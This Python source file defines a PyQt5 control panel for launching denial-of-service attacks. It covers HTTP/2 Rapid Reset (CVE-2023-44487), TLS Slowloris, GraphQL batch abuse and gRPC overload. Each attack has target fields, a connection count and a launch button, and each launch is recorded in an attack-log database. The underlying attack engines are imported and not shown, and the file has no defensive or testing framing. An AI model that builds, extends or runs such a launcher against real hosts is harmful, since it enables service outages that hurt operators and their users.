from PyQt5.QtWidgets import *
from PyQt5.QtCore import QThread, pyqtSignal
from engine.http2_attack import HTTP2RapidReset
from engine.tls_slowloris import TLSSlowloris
from engine.graphql_batch import GraphQLBatchAttack
from engine.grpc_overload import GRPCOverload
from database.db_manager import AttackDatabase

db = AttackDatabase()

class AttackRunner(QThread):
    log_signal = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, attack_func, *args, **kwargs):
        super().__init__()
        self.attack_func = attack_func
        self.args = args
        self.kwargs = kwargs

    def run(self):
        try:
            self.attack_func(*self.args, **self.kwargs)
        except Exception as e:
            self.log_signal.emit(f"Error: {e}")
        self.finished.emit()


class SlowlorisWorker(QThread):
    log_signal = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.attacker = TLSSlowloris()

    def run(self):
        try:
            self.attacker.attack(self.host, self.port)
        except Exception as e:
            self.log_signal.emit(f"Slowloris error: {e}")
        self.finished.emit()

    def stop(self):
        self.attacker.stop()


class WebAttackPanel(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.slow_worker = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        http2_group = QGroupBox("HTTP/2 Rapid Reset (CVE-2023-44487)")
        h2_layout = QFormLayout()
        self.h2_url = QLineEdit("https://example.com")
        h2_layout.addRow("Target URL:", self.h2_url)
        self.h2_conn = QSpinBox()
        self.h2_conn.setRange(1, 500)
        self.h2_conn.setValue(50)
        h2_layout.addRow("Connections:", self.h2_conn)
        self.h2_btn = QPushButton("Launch HTTP/2 Attack")
        self.h2_btn.clicked.connect(self.start_http2)
        h2_layout.addRow(self.h2_btn)
        http2_group.setLayout(h2_layout)
        layout.addWidget(http2_group)

        slow_group = QGroupBox("TLS Slowloris")
        slow_layout = QFormLayout()
        self.slow_host = QLineEdit("example.com")
        slow_layout.addRow("Host:", self.slow_host)
        self.slow_port = QSpinBox()
        self.slow_port.setRange(1, 65535)
        self.slow_port.setValue(443)
        slow_layout.addRow("Port:", self.slow_port)
        self.slow_btn = QPushButton("Start Slowloris")
        self.slow_btn.clicked.connect(self.start_slowloris)
        slow_layout.addRow(self.slow_btn)
        self.slow_stop_btn = QPushButton("Stop Slowloris")
        self.slow_stop_btn.clicked.connect(self.stop_slowloris)
        slow_layout.addRow(self.slow_stop_btn)
        slow_group.setLayout(slow_layout)
        layout.addWidget(slow_group)

        gql_group = QGroupBox("GraphQL Batch Abuse")
        gql_layout = QFormLayout()
        self.gql_url = QLineEdit("https://api.example.com/graphql")
        gql_layout.addRow("Endpoint:", self.gql_url)
        self.gql_btn = QPushButton("Start GraphQL Attack")
        self.gql_btn.clicked.connect(self.start_graphql)
        gql_layout.addRow(self.gql_btn)
        gql_group.setLayout(gql_layout)
        layout.addWidget(gql_group)

        grpc_group = QGroupBox("gRPC Overload")
        grpc_layout = QFormLayout()
        self.grpc_host = QLineEdit("localhost")
        grpc_layout.addRow("Host:", self.grpc_host)
        self.grpc_port = QSpinBox()
        self.grpc_port.setRange(1, 65535)
        self.grpc_port.setValue(50051)
        grpc_layout.addRow("Port:", self.grpc_port)
        self.grpc_btn = QPushButton("Start gRPC Overload")
        self.grpc_btn.clicked.connect(self.start_grpc)
        grpc_layout.addRow(self.grpc_btn)
        grpc_group.setLayout(grpc_layout)
        layout.addWidget(grpc_group)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        layout.addWidget(self.log_area)

        self.setLayout(layout)

    def start_http2(self):
        url = self.h2_url.text()
        conns = self.h2_conn.value()
        self.log_area.append(f"HTTP/2 attack on {url} ({conns} connections)")
        self.h2_btn.setEnabled(False)
        runner = AttackRunner(HTTP2RapidReset().start, url, connections=conns)
        runner.log_signal.connect(self.log_area.append)
        runner.finished.connect(lambda: self.h2_btn.setEnabled(True))
        runner.start()
        db.log_attack("HTTP/2 Rapid Reset", url, {"connections": conns})

    def start_slowloris(self):
        host = self.slow_host.text()
        port = self.slow_port.value()
        self.log_area.append(f"Slowloris on {host}:{port}")
        self.slow_btn.setEnabled(False)
        self.slow_worker = SlowlorisWorker(host, port)
        self.slow_worker.log_signal.connect(self.log_area.append)
        self.slow_worker.finished.connect(lambda: self.slow_btn.setEnabled(True))
        self.slow_worker.start()
        db.log_attack("TLS Slowloris", f"{host}:{port}", {})

    def stop_slowloris(self):
        if self.slow_worker and self.slow_worker.isRunning():
            self.slow_worker.stop()
            self.log_area.append("Slowloris stopped")
            self.slow_btn.setEnabled(True)

    def start_graphql(self):
        url = self.gql_url.text()
        self.log_area.append(f"GraphQL attack on {url}")
        self.gql_btn.setEnabled(False)
        runner = AttackRunner(GraphQLBatchAttack().attack, url)
        runner.log_signal.connect(self.log_area.append)
        runner.finished.connect(lambda: self.gql_btn.setEnabled(True))
        runner.start()
        db.log_attack("GraphQL Batch", url, {})

    def start_grpc(self):
        host = self.grpc_host.text()
        port = self.grpc_port.value()
        self.log_area.append(f"gRPC overload on {host}:{port}")
        self.grpc_btn.setEnabled(False)
        runner = AttackRunner(GRPCOverload().attack, host, port)
        runner.log_signal.connect(self.log_area.append)
        runner.finished.connect(lambda: self.grpc_btn.setEnabled(True))
        runner.start()
        db.log_attack("gRPC Overload", f"{host}:{port}", {})